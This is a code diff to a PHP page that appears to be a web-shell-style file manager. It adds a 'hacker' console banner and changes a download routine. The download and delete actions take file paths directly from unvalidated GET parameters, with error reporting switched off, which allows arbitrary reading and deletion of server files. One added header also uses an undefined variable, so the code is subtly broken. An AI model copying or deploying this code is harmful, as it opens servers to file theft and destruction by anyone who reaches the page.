@@ -35,6 +35,19 @@
 
 	</script>
 
+	<script type="text/javascript">
+		console.log(`
+
+			🅷🅰🅲🅺🅴🆁
+			🅹🅰🅽🅶🅰🅽
+			🅼🅴🅽🆈🅴🆁🅰🅽🅶
+
+			`);
+		console.log('Hacker jangan menyerang !!');
+	</script>
+
+
+
 	<?php
 
 	error_reporting(0);
@@ -91,14 +104,25 @@
 
 	if (isset($_GET['act'])) {
 		if ($_GET['act']=="download") {
-
+			@ob_clean();
 
 			$file_path = $_GET['dir'].$_GET['f'];
 			$filename = $_GET['f'];
+			
+
+			header('Content-Description: File Transfer');
+			header('Content-Type: application/octet-stream');
+			header('Content-Disposition: attachment; filename="'.basename($file).'"');
+
 			header("Content-Type: application/octet-stream");
 			header("Content-Transfer-Encoding: Binary");
 			header("Content-disposition: attachment; filename=\"".$filename."\""); 
-			echo readfile($file_path);
+			header('Expires: 0');
+			header('Cache-Control: must-revalidate');
+			header('Pragma: public');
+			header('Content-Length: ' . filesize($file_path));
+			readfile($file_path);
+			exit;
 		}elseif ($_GET['act']=="delete") {
 			$file_path = $_GET['dir'].$_GET['f'];
 			if(file_exists($file_path)) {
